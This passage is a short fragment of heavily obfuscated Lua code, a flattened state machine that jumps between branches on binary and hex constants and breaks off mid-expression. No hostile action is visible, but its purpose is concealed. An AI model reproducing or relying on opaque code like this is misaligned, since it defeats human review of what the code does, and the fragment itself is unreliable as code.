function(e,d)local a,k,l,q,p,h,c,j,g,_,b,n n=0b11001010 repeat if n<0x90 then if n>=0b111011 then if n>=0x5d then if n>0x5d then n=l~=l and n+-0x57 or n+-0b1010001 else n,a=0xb1,o.h(a(k,_))end elseif n<=0b111011 then n=l<=0 and 0b110101 or 0b10110011 else n=l<=0 and 0b10010010/n or 0b1110110-n end elseif n<=0b101101 then if n>0b10101 then n=l~=l and 0b11000111 or 0x1f77/n elseif n<=0b10 then n=p<g
